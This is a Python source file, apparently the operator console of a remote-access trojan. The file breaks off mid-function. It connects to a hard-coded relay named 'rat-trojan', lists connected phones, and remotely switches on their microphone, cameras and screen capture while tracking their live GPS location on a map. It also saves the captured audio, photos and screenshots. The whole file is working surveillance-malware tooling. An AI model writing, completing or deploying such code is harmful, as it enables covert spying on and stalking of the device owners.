import asyncio
import io
import json
import os
import platform
import queue
import threading
import time
import uuid

from datetime import datetime
from pathlib import Path

import websockets

from live_map import (
    start_map_server,
    open_map,
    set_location,
)


# ============================================================
# OPTIONAL GUI / IMAGE LIBRARIES
# ============================================================

try:

    import tkinter as tk

    from PIL import Image, ImageTk

    TK_AVAILABLE = True

except ImportError:

    TK_AVAILABLE = False


try:

    import cv2
    import numpy as np

    CV2_AVAILABLE = True

except ImportError:

    CV2_AVAILABLE = False


# ============================================================
# CONFIG
# ============================================================

RENDER_URL = (
    "wss://rat-trojan.onrender.com/ws"
)

PC_DEVICE_ID = "pc-main"

PAIRING_SECRET = os.getenv(
    "LAB_SECRET",
    "LAB-123456",
)

HEARTBEAT_INTERVAL = 10

RECONNECT_DELAY = 5


# ============================================================
# MEDIA SETTINGS
# ============================================================

CAMERA_SAVE_INTERVAL = 5.0

CAMERA_VIDEO_PHOTOS = 20

CAMERA_VIDEO_FPS = 5.0

AUDIO_SAVE_INTERVAL = 20.0


# ============================================================
# DIRECTORIES
# ============================================================

BASE_DIR = Path(
    __file__
).resolve().parent

RECEIVED_DIR = (
    BASE_DIR /
    "received_data"
)

CAMERA_DIR = (
    RECEIVED_DIR /
    "camera"
)

SCREEN_DIR = (
    RECEIVED_DIR /
    "screens"
)

AUDIO_DIR = (
    RECEIVED_DIR /
    "audio"
)

VIDEO_DIR = (
    RECEIVED_DIR /
    "camera_videos"
)


CAMERA_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

SCREEN_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

AUDIO_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

VIDEO_DIR.mkdir(
    parents=True,
    exist_ok=True,
)


# ============================================================
# GLOBAL CONNECTION STATE
# ============================================================

websocket = None

connected = False

registered = False

devices = {}

pending_requests = {}

pending_binary_metadata = None


# ============================================================
# LOCATION STATE
# ============================================================

locations = {}

location_lock = threading.Lock()


# ============================================================
# ASYNCIO LOOP
# ============================================================

asyncio_loop = None


# ============================================================
# MEDIA QUEUE
# ============================================================

media_queue = None

MEDIA_QUEUE_MAX_SIZE = 200


# ============================================================
# AUDIO STATE
# ============================================================

audio_buffer = bytearray()

audio_buffer_started = None

audio_source_device = "unknown"

audio_lock = None


# ============================================================
# CAMERA STATE
# ============================================================

last_camera_save = 0.0

camera_video_frames = []

camera_video_lock = None


# ============================================================
# GUI STATE
# ============================================================

ui_enabled = True

ui_visible = True

camera_ui_enabled = True

screen_ui_enabled = True


ui_frames = {

    "camera":
        None,

    "screen":
        None,
}


ui_frame_lock = threading.Lock()

ui_command_queue = queue.Queue()

gui_output_queue = queue.Queue()

ui_ready = threading.Event()

ui_thread = None


# ============================================================
# GUI SERVICE STATE
# ============================================================

service_states = {

    "location":
        False,

    "microphone":
        False,

    "camera_front":
        False,

    "camera_back":
        False,

    "screen":
        False,
}


# ============================================================
# SEND LOCK
# ============================================================

send_lock = None


# ============================================================
# UTILITY
# ============================================================

def now():

    return time.time()


def make_request_id():

    return uuid.uuid4().hex[:12]


def timestamp_string():

    return datetime.now().strftime(
        "%Y%m%d_%H%M%S_%f"
    )


def clear_screen():

    os.system(
        "cls"
        if os.name == "nt"
        else "clear"
    )


# ============================================================
# GUI LOG
# ============================================================

def gui_log(message):

    print(message)

    try:

        gui_output_queue.put_nowait(
            str(message)
        )

    except Exception:
        pass


# ============================================================
# PC INFO
# ============================================================

def get_pc_info():

    return {

        "device_id":
            PC_DEVICE_ID,

        "device_type":
            "pc",

        "hostname":
            platform.node(),

        "platform":
            platform.system(),

        "platform_release":
            platform.release(),

        "platform_version":
            platform.version(),

        "architecture":
            platform.machine(),

        "processor":
            platform.processor(),

        "python_version":
            platform.python_version(),

        "agent_status":
            "active",

        "timestamp":
            now(),
    }


# ============================================================
# SEND JSON
# ============================================================

async def send_json(
    data
):

    global websocket

    if websocket is None:
        return False

    try:

        async with send_lock:

            await websocket.send(
                json.dumps(data)
            )

        return True

    except Exception as exc:

        gui_log(
            f"[SEND ERROR] {exc}"
        )

        return False


# ============================================================
# REGISTER PC
# ============================================================

async def register_pc():

    data = {

        "type":
            "pc_register",

        "secret":
            PAIRING_SECRET,

        "device_id":
            PC_DEVICE_ID,

        "device_type":
            "pc",

        "info":
            get_pc_info(),
    }

    return await send_json(
        data
    )


# ============================================================
# REQUEST DEVICES
# ============================================================

async def request_devices():

    return await send_json(

        {
            "type":
                "list_devices"
        }
    )


# ============================================================
# HEARTBEAT
# ============================================================

async def heartbeat_loop():

    while connected:

        try:

            await asyncio.sleep(
                HEARTBEAT_INTERVAL
            )

            if not connected:
                break

            await send_json(

                {
                    "type":
                        "heartbeat",

                    "device_id":
                        PC_DEVICE_ID,

                    "timestamp":
                        now(),
                }
            )

        except asyncio.CancelledError:

            break

        except Exception as exc:

            gui_log(
                f"[HEARTBEAT ERROR] {exc}"
            )

            break


# ============================================================
# SEND COMMAND
# ============================================================

async def send_command(
    device_id,
    command,
    args=None,
):

    if not connected:

        gui_log(
            "[ERROR] PC is not connected."
        )

        return None

    if not device_id:

        gui_log(
            "[ERROR] Missing device ID."
        )

        return None

    if args is None:
        args = {}

    request_id = (
        make_request_id()
    )

    message = {

        "type":
            "command",

        "request_id":
            request_id,

        "device_id":
            device_id,

        "command":
            command,

        "args":
            args,

        "source_device_id":
            PC_DEVICE_ID,
    }

    pending_requests[
        request_id
    ] = {

        "device_id":
            device_id,

        "command":
            command,

        "created":
            now(),
    }

    sent = await send_json(
        message
    )

    if not sent:

        pending_requests.pop(
            request_id,
            None,
        )

        return None

    gui_log(
        f"[COMMAND SENT] "
        f"{command} -> "
        f"{device_id}"
    )

    return request_id


# ============================================================
# PRINT DEVICES
# ============================================================

def print_devices():

    print()

    print(
        "DEVICES"
    )

    print(
        "=" * 80
    )

    if not devices:

        print(
            "No devices received."
        )

        print()

        return

    for device_id, device in devices.items():

        status = device.get(
            "status",
            "unknown",
        )

        device_type = device.get(
            "device_type",
            "unknown",
        )

        info = device.get(
            "info",
            {},
        )

        print(
            f"ID      : {device_id}"
        )

        print(
            f"TYPE    : {device_type}"
        )

        print(
            f"STATUS  : {status}"
        )

        if info:

            manufacturer = info.get(
                "manufacturer"
            )

            model = info.get(
                "model"
            )

            android_version = info.get(
                "android_version"
            )

            if manufacturer:

                print(
                    f"DEVICE  : "
                    f"{manufacturer} "
                    f"{model or ''}"
                )

            if android_version:

                print(
                    f"ANDROID : "
                    f"{android_version}"
                )

        location = locations.get(
            device_id
        )

        if location:

            print(
                f"LOCATION: "
                f"{location.get('latitude')}, "
                f"{location.get('longitude')}"
            )

        print(
            "-" * 80
        )

    print()


# ============================================================
# HANDLE DEVICES
# ============================================================

def handle_devices(
    data
):

    global devices

    device_list = data.get(
        "devices",
        [],
    )

    devices = {}

    for device in device_list:

        device_id = device.get(
            "device_id"
        )

        if not device_id:
            continue

        devices[
            device_id
        ] = device

        location = device.get(
            "location"
        )

        if location:

            with location_lock:

                locations[
                    device_id
                ] = location

    print_devices()

    gui_log(
        f"[DEVICES] "
        f"{len(devices)} device(s)"
    )


# ============================================================
# HANDLE LOCATION
# ============================================================

def handle_location(data):

    device_id = data.get(
        "device_id"
    )

    if not device_id:

        gui_log(
            "[LOCATION] Missing device ID."
        )

        return

    location = {

        "type":
            "location",

        "device_id":
            device_id,

        "latitude":
            data.get(
                "latitude"
            ),

        "longitude":
            data.get(
                "longitude"
            ),

        "accuracy":
            data.get(
                "accuracy"
            ),

        "altitude":
            data.get(
                "altitude"
            ),

        "speed":
            data.get(
                "speed"
            ),

        "bearing":
            data.get(
                "bearing"
            ),

        "timestamp":
            data.get(
                "timestamp",
                time.time()
            ),
    }

    # Store location for GUI.
    with location_lock:

        locations[
            device_id
        ] = location

    # Send location to Leaflet map.
    set_location(
        location
    )

    set_service_state(
        "location",
        True
    )

    latitude = location.get(
        "latitude"
    )

    longitude = location.get(
        "longitude"
    )

    accuracy = location.get(
        "accuracy"
    )

    gui_log(

        "[LOCATION] "
        f"{device_id} -> "
        f"lat={latitude}, "
        f"lon={longitude}, "
        f"accuracy={accuracy}m"
    )

    try:

        ui_command_queue.put(

            (
                "location",
                location
            )
        )

    except Exception:
        pass

# ============================================================
# COMMAND RESPONSE
# ============================================================

def handle_command_response(
    data
):

    request_id = data.get(
        "request_id"
    )

    success = data.get(
        "success",
        False,
    )

    command_info = (
        pending_requests.get(
            request_id,
            {}
        )
    )

    command = command_info.get(
        "command"
    )

    if success:

        response_data = data.get(
            "data",
            {},
        )

        gui_log(
            "[COMMAND OK]"
        )

        if response_data:

            gui_log(
                json.dumps(
                    response_data,
                    indent=2,
                )
            )

        else:

            gui_log(
                "Command completed."
            )

        # ----------------------------------------------------
        # MICROPHONE
        # ----------------------------------------------------

        if command == (
            "start_microphone"
        ):

            set_service_state(
                "microphone",
                True
            )

        elif command == (
            "stop_microphone"
        ):

            set_service_state(
                "microphone",
                False
            )

        # ----------------------------------------------------
        # SCREEN
        # ----------------------------------------------------

        elif command == (
            "start_screen"
        ):

            set_service_state(
                "screen",
                True
            )

        elif command == (
            "stop_screen"
        ):

            set_service_state(
                "screen",
                False
            )

        # ----------------------------------------------------
        # CAMERA FRONT START
        # ----------------------------------------------------

        elif command == (
            "camera_front_start"
        ):

            set_service_state(
                "camera_front",
                True
            )

            set_service_state(
                "camera_back",
                False
            )

        # ----------------------------------------------------
        # CAMERA FRONT STOP
        # ----------------------------------------------------

        elif command == (
            "camera_front_stop"
        ):

            set_service_state(
                "camera_front",
                False
            )

        # ----------------------------------------------------
        # CAMERA BACK START
        # ----------------------------------------------------

        elif command == (
            "camera_back_start"
        ):

            set_service_state(
                "camera_front",
                False
            )

            set_service_state(
                "camera_back",
                True
            )

        # ----------------------------------------------------
        # CAMERA BACK STOP
        # ----------------------------------------------------

        elif command == (
            "camera_back_stop"
        ):

            set_service_state(
                "camera_back",
                False
            )

        # ----------------------------------------------------
        # CAMERA SWITCH
        # ----------------------------------------------------

        elif command == (
            "camera_switch"
        ):

            front_active = (
                service_states[
                    "camera_front"
                ]
            )

            back_active = (
                service_states[
                    "camera_back"
                ]
            )

            if front_active:

                set_service_state(
                    "camera_front",
                    False
                )

                set_service_state(
                    "camera_back",
                    True
                )

            elif back_active:

                set_service_state(
                    "camera_back",
                    False
                )

                set_service_state(
                    "camera_front",
                    True
                )

        # ----------------------------------------------------
        # LOCATION
        # ----------------------------------------------------

        elif command == (
            "location_request"
        ):

            # Don't mark location active
            # merely because a request was sent.
            # handle_location() will mark it
            # active once actual location arrives.

            pass

    else:

        error = data.get(

            "error",

            data.get(
                "message",
                "unknown_error",
            ),
        )

        gui_log(
            f"[COMMAND FAILED] {error}"
        )

    if request_id:

        pending_requests.pop(
            request_id,
            None,
        )


# ============================================================
# SERVICE STATE
# ============================================================

def set_service_state(
    key,
    value,
):

    service_states[
        key
    ] = value

    try:

        ui_command_queue.put(

            (
                "indicator",
                key,
                value,
            )
        )

    except Exception:
        pass


# ============================================================
# UPDATE UI FRAME
# ============================================================

def update_ui_frame(
    media_type,
    payload,
):

    global ui_frames

    if media_type == (
        "camera_frame"
    ):

        if not camera_ui_enabled:
            return

        key = "camera"

    elif media_type == (
        "screen_frame"
    ):

        if not screen_ui_enabled:
            return

        key = "screen"

    else:

        return

    with ui_frame_lock:

        ui_frames[
            key
        ] = bytes(
            payload
        )


# ============================================================
# GUI CLASS
# ============================================================

class MediaViewer:

    def __init__(self):

        self.root = tk.Tk()

        self.root.title(
            "JARVIS REMOTE CONTROL"
        )

        self.root.geometry(
            "1500x900"
        )

        self.root.minsize(
            1100,
            700
        )

        self.root.configure(
            bg="#101010"
        )

        self.root.protocol(
            "WM_DELETE_WINDOW",
            self.hide_window
        )

        # ====================================================
        # HEADER
        # ====================================================

        header = tk.Frame(
            self.root,
            bg="#111111",
            height=55
        )

        header.pack(
            fill="x"
        )

        title = tk.Label(

            header,

            text=
                "JARVIS REMOTE CONTROL",

            fg="white",

            bg="#111111",

            font=(
                "Segoe UI",
                17,
                "bold"
            )
        )

        title.pack(
            side="left",
            padx=18,
            pady=12
        )

        self.connection_label = tk.Label(

            header,

            text=
                "● DISCONNECTED",

            fg="#ff4444",

            bg="#111111",

            font=(
                "Segoe UI",
                11,
                "bold"
            )
        )

        self.connection_label.pack(
            side="right",
            padx=18
        )

        # ====================================================
        # DEVICE BAR
        # ====================================================

        device_bar = tk.Frame(

            self.root,

            bg="#181818",

            height=50
        )

        device_bar.pack(
            fill="x"
        )

        tk.Label(

            device_bar,

            text="DEVICE",

            fg="#aaaaaa",

            bg="#181818",

            font=(
                "Segoe UI",
                10,
                "bold"
            )
        ).pack(
            side="left",
            padx=(15, 5)
        )

        self.device_var = (
            tk.StringVar(
                value="No device"
            )
        )

        self.device_menu = tk.OptionMenu(

            device_bar,

            self.device_var,

            "No device"
        )

        self.device_menu.configure(

            bg="#252525",

            fg="white",

            activebackground="#333333",

            activeforeground="white",

            relief="flat",

            highlightthickness=0
        )

        self.device_menu[
            "menu"
        ].configure(

            bg="#252525",

            fg="white"
        )

        self.device_menu.pack(

            side="left",

            padx=5
        )

        tk.Button(

            device_bar,

            text="REFRESH",

            command=
                self.refresh_devices,

            bg="#292929",

            fg="white",

            activebackground="#404040",

            activeforeground="white",

            relief="flat"
        ).pack(

            side="left",

            padx=8
        )

        # ====================================================
        # STATUS INDICATORS
        # ====================================================

        status_frame = tk.Frame(

            self.root,

            bg="#101010"
        )

        status_frame.pack(

            fill="x",

            padx=10,

            pady=8
        )

        self.indicators = {}

        indicator_names = [

            (
                "location",
                "LOCATION"
            ),

            (
                "microphone",
                "MICROPHONE"
            ),

            (
                "camera_front",
                "CAM FRONT"
            ),

            (
                "camera_back",
                "CAM BACK"
            ),

            (
                "screen",
                "SCREEN SHARE"
            ),
        ]

        for key, text in indicator_names:

            frame = tk.Frame(

                status_frame,

                bg="#1c1c1c",

                bd=1,

                relief="solid"
            )

            frame.pack(

                side="left",

                fill="x",

                expand=True,

                padx=4
            )

            dot = tk.Label(

                frame,

                text="●",

                fg="#555555",

                bg="#1c1c1c",

                font=(
                    "Segoe UI",
                    15,
                    "bold"
                )
            )

            dot.pack(

                side="left",

                padx=(8, 4)
            )

            label = tk.Label(

                frame,

                text=text,

                fg="#bbbbbb",

                bg="#1c1c1c",

                font=(
                    "Segoe UI",
                    9,
                    "bold"
                )
            )

            label.pack(

                side="left",

                padx=(0, 8),

                pady=8
            )

            self.indicators[
                key
            ] = dot

        # ====================================================
        # MAIN CONTENT
        # ====================================================

        content = tk.Frame(

            self.root,

            bg="#101010"
        )

        content.pack(

            fill="both",

            expand=True,

            padx=10,

            pady=(0, 10)
        )

        # ====================================================
        # LEFT CONTROL PANEL
        # ====================================================

        left = tk.Frame(

            content,

            bg="#181818",

            width=285
        )

        left.pack(

            side="left",

            fill="y",

            padx=(0, 6)
        )

        left.pack_propagate(
            False
        )

        tk.Label(

            left,

            text="COMMANDS",

            fg="white",

            bg="#181818",

            font=(
                "Segoe UI",
                12,
                "bold"
            )
        ).pack(
            pady=(12, 8)
        )

        # ====================================================
        # COMMAND INPUT
        # ====================================================

        self.command_entry = tk.Entry(

            left,

            bg="#0d0d0d",

            fg="white",

            insertbackground="white",

            relief="flat",

            font=(
                "Consolas",
                10
            )
        )

        self.command_entry.pack(

            fill="x",

            padx=12,

            pady=5,

            ipady=7
        )

        self.command_entry.bind(

            "<Return>",

            lambda event:
                self.execute_command()
        )

        tk.Button(

            left,

            text="SEND COMMAND",

            command=
                self.execute_command,

            bg="#303030",

            fg="white",

            activebackground="#444444",

            activeforeground="white",

            relief="flat"
        ).pack(

            fill="x",

            padx=12,

            pady=5
        )

        # ====================================================
        # SERVICE TITLE
        # ====================================================

        tk.Label(

            left,

            text="SERVICES",

            fg="#aaaaaa",

            bg="#181818",

            font=(
                "Segoe UI",
                9,
                "bold"
            )
        ).pack(
            pady=(18, 5)
        )

        # ====================================================
        # SERVICE BUTTONS
        # ====================================================

        self.service_button(
            left,
            "START / STOP MICROPHONE",
            self.toggle_microphone
        )

        self.service_button(
            left,
            "START / STOP SCREEN",
            self.toggle_screen
        )

        self.service_button(
            left,
            "FRONT CAMERA START",
            self.camera_front_start
        )

        self.service_button(
            left,
            "FRONT CAMERA STOP",
            self.camera_front_stop
        )

        self.service_button(
            left,
            "BACK CAMERA START",
            self.camera_back_start
        )

        self.service_button(
            left,
            "BACK CAMERA STOP",
            self.camera_back_stop
        )

        self.service_button(
            left,
            "SWITCH CAMERA",
            self.camera_switch
        )

        self.service_button(
            left,
            "REQUEST LOCATION",
            self.get_location
        )

        self.service_button(
            left,
            "TOGGLE CAMERA WINDOW",
            self.toggle_camera_window
        )

        self.service_button(
            left,
            "TOGGLE SCREEN WINDOW",
            self.toggle_screen_window
        )

        # ====================================================
        # LOCATION PANEL
        # ====================================================

        location_box = tk.Frame(

            left,

            bg="#202020",

            bd=1,

            relief="solid"
        )

        location_box.pack(

            fill="x",

            padx=10,

            pady=(15, 5)
        )

        tk.Label(

            location_box,

            text="CURRENT LOCATION",

            fg="white",

            bg="#202020",

            font=(
                "Segoe UI",
                9,
                "bold"
            )
        ).pack(

            anchor="w",

            padx=8,

            pady=(7, 3)
        )

        self.location_text = tk.Label(

            location_box,

            text="No location received.",

            fg="#aaaaaa",

            bg="#202020",

            justify="left",

            anchor="w",

            font=(
                "Consolas",
                8
            )
        )

        self.location_text.pack(

            fill="x",

            padx=8,

            pady=(0, 8)
        )

        # ====================================================
        # CENTER MEDIA
        # ====================================================

        self.media_frame = tk.Frame(

            content,

            bg="#181818"
        )

        self.media_frame.pack(

            side="left",

            fill="both",

            expand=True,

            padx=6
        )

        # ====================================================
        # CAMERA
        # ====================================================

        self.camera_panel = tk.Frame(

            self.media_frame,

            bg="#202020",

            bd=1,

            relief="solid"
        )

        self.camera_panel.pack(

            side="left",

            fill="both",

            expand=True,

            padx=4,

            pady=4
        )

        tk.Label(

            self.camera_panel,

            text="CAMERA",

            fg="white",

            bg="#202020",

            font=(
                "Segoe UI",
                11,
                "bold"
            )
        ).pack(
            pady=5
        )

        self.camera_label = tk.Label(

            self.camera_panel,

            text="Waiting for camera...",

            fg="white",

            bg="black"
        )

        self.camera_label.pack(

            fill="both",

            expand=True,

            padx=5,

            pady=5
        )

        # ====================================================
        # SCREEN
        # ====================================================

        self.screen_panel = tk.Frame(

            self.media_frame,

            bg="#202020",

            bd=1,

            relief="solid"
        )

        self.screen_panel.pack(

            side="right",

            fill="both",

            expand=True,

            padx=4,

            pady=4
        )

        tk.Label(

            self.screen_panel,

            text="REMOTE SCREEN",

            fg="white",

            bg="#202020",

            font=(
                "Segoe UI",
                11,
                "bold"
            )
        ).pack(
            pady=5
        )

        self.screen_label = tk.Label(

            self.screen_panel,

            text="Waiting for screen...",

            fg="white",

            bg="black"
        )

        self.screen_label.pack(

            fill="both",

            expand=True,

            padx=5,

            pady=5
        )

        # ====================================================
        # RIGHT OUTPUT
        # ====================================================

        right = tk.Frame(

            content,

            bg="#181818",

            width=330
        )

        right.pack(

            side="right",

            fill="y",

            padx=(6, 0)
        )

        right.pack_propagate(
            False
        )

        tk.Label(

            right,

            text="OUTPUT",

            fg="white",

            bg="#181818",

            font=(
                "Segoe UI",
                12,
                "bold"
            )
        ).pack(
            pady=(12, 5)
        )

        self.output_text = tk.Text(

            right,

            bg="#090909",

            fg="#dddddd",

            insertbackground="white",

            font=(
                "Consolas",
                9
            ),

            relief="flat",

            wrap="word",

            state="disabled"
        )

        self.output_text.pack(

            fill="both",

            expand=True,

            padx=8,

            pady=8
        )

        # ====================================================
        # FOOTER
        # ====================================================

        footer = tk.Frame(

            self.root,

            bg="#111111",

            height=35
        )

        footer.pack(
            fill="x"
        )

        self.footer_status = tk.Label(

            footer,

            text="JARVIS PC AGENT",

            fg="#777777",

            bg="#111111",

            font=(
                "Segoe UI",
                9
            )
        )

        self.footer_status.pack(

            side="left",

            padx=12,

            pady=8
        )

        # ====================================================
        # INITIAL OUTPUT
        # ====================================================

        self.write_output(
            "[SYSTEM] GUI initialized."
        )

        self.write_output(
            "[SYSTEM] Waiting for PC connection..."
        )

        # ====================================================
        # POLLING
        # ====================================================

        self.poll_frames()

        ui_ready.set()

        self.root.mainloop()

    # ========================================================
    # BUTTON HELPER
    # ========================================================

    def service_button(
        self,
        parent,
        text,
        command,
    ):

        button = tk.Button(

            parent,

            text=text,

            command=command,

            bg="#252525",

            fg="white",

            activebackground="#3b3b3b",

            activeforeground="white",

            relief="flat",

            font=(
                "Segoe UI",
                9
            )
        )

        button.pack(

            fill="x",

            padx=12,

            pady=3,

            ipady=4
        )

    # ========================================================
    # DEVICE
    # ========================================================

    def get_selected_device(self):

        value = (
            self.device_var.get()
        )

        if value == "No device":

            self.write_output(
                "[ERROR] No device selected."
            )

            return None

        return value

    # ========================================================
    # REFRESH DEVICES
    # ========================================================

    def refresh_devices(self):

        if not connected:

            self.write_output(
                "[ERROR] Not connected."
            )

            return

        if asyncio_loop is None:

            self.write_output(
                "[ERROR] Async loop unavailable."
            )

            return

        asyncio.run_coroutine_threadsafe(

            request_devices(),

            asyncio_loop
        )

        self.write_output(
            "[DEVICE] Refresh requested."
        )

    # ========================================================
    # UPDATE DEVICE MENU
    # ========================================================

    def update_devices(self):

        menu = self.device_menu[
            "menu"
        ]

        menu.delete(
            0,
            "end"
        )

        if not devices:

            menu.add_command(

                label="No device",

                command=lambda:
                    self.device_var.set(
                        "No device"
                    )
            )

            self.device_var.set(
                "No device"
            )

            return

        for device_id in devices:

            menu.add_command(

                label=device_id,

                command=lambda
                value=device_id:
                    self.device_var.set(
                        value
                    )
            )

        current = (
            self.device_var.get()
        )

        if current in devices:
            return

        first = next(
            iter(devices)
        )

        self.device_var.set(
            first
        )

    # ========================================================
    # OUTPUT
    # ========================================================

    def write_output(
        self,
        message,
    ):

        self.output_text.configure(
            state="normal"
        )

        self.output_text.insert(

            "end",

            (
                datetime.now().strftime(
                    "%H:%M:%S"
                )
                + " "
                + str(message)
                + "\n"
            )
        )

        self.output_text.see(
            "end"
        )

        self.output_text.configure(
            state="disabled"
        )

    # ========================================================
    # COMMAND EXECUTION
    # ========================================================

    def execute_command(self):

        command_line = (
            self.command_entry
            .get()
            .strip()
        )

        if not command_line:
            return

        self.write_output(
            f"> {command_line}"
        )

        self.command_entry.delete(
            0,
            "end"
        )

        parts = command_line.split()

        if not parts:
            return

        command = (
            parts[0].lower()
        )

        # ====================================================
        # LOCAL DEVICES COMMAND
        # ====================================================

        if command == "devices":

            if not connected:

                self.write_output(
                    "[ERROR] Not connected."
                )

                return

            if asyncio_loop is None:

                self.write_output(
                    "[ERROR] Async loop unavailable."
                )

                return

            asyncio.run_coroutine_threadsafe(

                request_devices(),

                asyncio_loop
            )

            self.write_output(
                "[DEVICE] Device list requested."
            )

            return

        # ====================================================
        # LOCAL REFRESH
        # ====================================================

        if command == "refresh":

            self.refresh_devices()

            return

        # ====================================================
        # LOCAL HELP
        # ====================================================

        if command == "help":

            self.write_output(
                "devices"
            )

            self.write_output(
                "refresh"
            )

            self.write_output(
                "info"
            )

            self.write_output(
                "battery"
            )

            self.write_output(
                "status"
            )

            self.write_output(
                "location"
            )

            self.write_output(
                "screen-start"
            )

            self.write_output(
                "screen-stop"
            )

            self.write_output(
                "microphone-start"
            )

            self.write_output(
                "microphone-stop"
            )

            self.write_output(
                "camera-front-start"
            )

            self.write_output(
                "camera-front-stop"
            )

            self.write_output(
                "camera-back-start"
            )

            self.write_output(
                "camera-back-stop"
            )

            self.write_output(
                "camera-switch"
            )

            return

        # ====================================================
        # NORMAL DEVICE COMMAND
        # ====================================================

        device_id = (
            self.get_selected_device()
        )

        if device_id is None:
            return

        command_map = {

            "info":
                "device_info",

            "battery":
                "battery_status",

            "status":
                "connection_status",

            "location":
                "location_request",

            "screen-start":
                "start_screen",

            "screen-stop":
                "stop_screen",

            "microphone-start":
                "start_microphone",

            "microphone-stop":
                "stop_microphone",

            "camera-front-start":
                "camera_front_start",

            "camera-front-stop":
                "camera_front_stop",

            "camera-back-start":
                "camera_back_start",

            "camera-back-stop":
                "camera_back_stop",

            "camera-switch":
                "camera_switch",
        }

        server_command = (
            command_map.get(
                command
            )
        )

        if server_command is None:

            self.write_output(
                "[ERROR] Unknown command: "
                f"{command}"
            )

            return

        if asyncio_loop is None:

            self.write_output(
                "[ERROR] Async loop unavailable."
            )

            return

        asyncio.run_coroutine_threadsafe(

            send_command(

                device_id,

                server_command
            ),

            asyncio_loop
        )

    # ========================================================
    # SEND GUI COMMAND
    # ========================================================

    def send_gui_command(
        self,
        command,
    ):

        device_id = (
            self.get_selected_device()
        )

        if device_id is None:
            return

        if asyncio_loop is None:

            self.write_output(
                "[ERROR] Async loop unavailable."
            )

            return

        asyncio.run_coroutine_threadsafe(

            send_command(

                device_id,

                command
            ),

            asyncio_loop
        )

        self.write_output(
            f"[COMMAND] {command}"
        )

    # ========================================================
    # MICROPHONE
    # ========================================================

    def toggle_microphone(self):

        if service_states[
            "microphone"
        ]:

            self.send_gui_command(
                "stop_microphone"
            )

        else:

            self.send_gui_command(
                "start_microphone"
            )

    # ========================================================
    # SCREEN
    # ========================================================

    def toggle_screen(self):

        if service_states[
            "screen"
        ]:

            self.send_gui_command(
                "stop_screen"
            )

        else:

            self.send_gui_command(
                "start_screen"
            )

    # ========================================================
    # CAMERA FRONT START
    # ========================================================

    def camera_front_start(self):

        self.send_gui_command(
            "camera_front_start"
        )

    # ========================================================
    # CAMERA FRONT STOP
    # ========================================================

    def camera_front_stop(self):

        self.send_gui_command(
            "camera_front_stop"
        )

    # ========================================================
    # CAMERA BACK START
    # ========================================================

    def camera_back_start(self):

        self.send_gui_command(
            "camera_back_start"
        )

    # ========================================================
    # CAMERA BACK STOP
    # ========================================================

    def camera_back_stop(self):

        self.send_gui_command(
            "camera_back_stop"
        )

    # ========================================================
    # CAMERA SWITCH
    # ========================================================

    def camera_switch(self):

        self.send_gui_command(
            "camera_switch"
        )

    # ========================================================
    # LOCATION
    # ========================================================

    def get_location(self):

        self.send_gui_command(
            "location_request"
        )

    # ========================================================
    # CAMERA WINDOW
    # ========================================================

    def toggle_camera_window(self):

        global camera_ui_enabled

        camera_ui_enabled = (
            not camera_ui_enabled
        )

        self.set_camera_visible(
            camera_ui_enabled
        )

        self.write_output(

            "[GUI] Camera window "
            +
            (
                "ON"
                if camera_ui_enabled
                else "OFF"
            )
        )

    # ========================================================
    # SCREEN WINDOW
    # ========================================================

    def toggle_screen_window(self):

        global screen_ui_enabled

        screen_ui_enabled = (
            not screen_ui_enabled
        )

        self.set_screen_visible(
            screen_ui_enabled
        )

        self.write_output(

            "[GUI] Screen window "
            +
            (
                "ON"
                if screen_ui_enabled
                else "OFF"
            )
        )

    # ========================================================
    # UPDATE INDICATOR
    # ========================================================

    def update_indicator(
        self,
        key,
        active,
    ):

        dot = self.indicators.get(
            key
        )

        if dot is None:
            return

        dot.configure(

            fg=(
                "#00ff88"
                if active
                else "#555555"
            )
        )

    # ========================================================
    # CONNECTION STATUS
    # ========================================================

    def set_connection_status(
        self,
        state,
    ):

        if state:

            self.connection_label.configure(

                text=
                    "● CONNECTED",

                fg=
                    "#00ff88"
            )

            self.footer_status.configure(

                text=
                    "JARVIS PC AGENT "
                    "• ONLINE"
            )

        else:

            self.connection_label.configure(

                text=
                    "● DISCONNECTED",

                fg=
                    "#ff4444"
            )

            self.footer_status.configure(

                text=
                    "JARVIS PC AGENT "
                    "• OFFLINE"
            )

    # ========================================================
    # HIDE
    # ========================================================

    def hide_window(self):

        global ui_visible

        ui_visible = False

        self.root.withdraw()

    # ========================================================
    # SHOW
    # ========================================================

    def show_window(self):

        global ui_visible

        ui_visible = True

        self.root.deiconify()

        self.root.lift()

    # ========================================================
    # CAMERA VISIBILITY
    # ========================================================

    def set_camera_visible(
        self,
        visible,
    ):

        if visible:

            self.camera_panel.pack(

                side="left",

                fill="both",

                expand=True,

                padx=4,

                pady=4
            )

        else:

            self.camera_panel.pack_forget()

    # ========================================================
    # SCREEN VISIBILITY
    # ========================================================

    def set_screen_visible(
        self,
        visible,
    ):

        if visible:

            self.screen_panel.pack(

                side="right",

                fill="both",

                expand=True,

                padx=4,

                pady=4
            )

        else:

            self.screen_panel.pack_forget()

    # ========================================================
    # UPDATE LOCATION UI
    # ========================================================

    def update_location_display(
        self,
        location,
    ):

        latitude = location.get(
            "latitude"
        )

        longitude = location.get(
            "longitude"
        )

        accuracy = location.get(
            "accuracy"
        )

        altitude = location.get(
            "altitude"
        )

        speed = location.get(
            "speed"
        )

        bearing = location.get(
            "bearing"
        )

        timestamp = location.get(
            "timestamp"
        )

        if timestamp:

            try:

                time_text = (
                    datetime.fromtimestamp(
                        float(timestamp)
                    ).strftime(
                        "%H:%M:%S"
                    )
                )

            except Exception:

                time_text = str(
                    timestamp
                )

        else:

            time_text = "unknown"

        text = (

            f"Device : "
            f"{location.get('device_id')}\n"

            f"Lat    : "
            f"{latitude}\n"

            f"Lon    : "
            f"{longitude}\n"

            f"Accuracy: "
            f"{accuracy} m\n"

            f"Altitude: "
            f"{altitude}\n"

            f"Speed  : "
            f"{speed}\n"

            f"Bearing: "
            f"{bearing}\n"

            f"Time   : "
            f"{time_text}"
        )

        self.location_text.configure(
            text=text,
            fg="#00ff88"
        )

    # ========================================================
    # PROCESS COMMANDS
    # ========================================================

    def process_commands(self):

        global ui_enabled
        global ui_visible
        global camera_ui_enabled
        global screen_ui_enabled

        while True:

            try:

                command = (
                    ui_command_queue
                    .get_nowait()
                )

            except queue.Empty:

                break

            # ------------------------------------------------
            # SIMPLE COMMANDS
            # ------------------------------------------------

            if command == "show":

                ui_enabled = True

                self.show_window()

            elif command == "hide":

                ui_enabled = False
